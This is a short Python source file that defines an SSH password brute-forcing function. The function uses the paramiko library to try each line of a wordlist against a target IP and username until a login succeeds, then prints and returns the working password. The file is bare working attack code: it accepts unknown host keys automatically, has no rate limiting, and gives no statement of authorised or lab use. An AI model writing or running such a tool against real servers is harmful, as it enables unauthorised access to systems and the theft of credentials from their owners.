import paramiko
from tkinter import filedialog

def ssh_brute_force(target_ip, username, password_list):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    with open(password_list, 'r') as file:
        for password in file:
            password = password.strip()
            try:
                ssh_client.connect(target_ip, username=username, password=password, timeout=3)
                print(f"Login successful: {username}@{target_ip} with password: {password}")
                ssh_client.close()
                return password
            except paramiko.AuthenticationException:
                continue
    return None
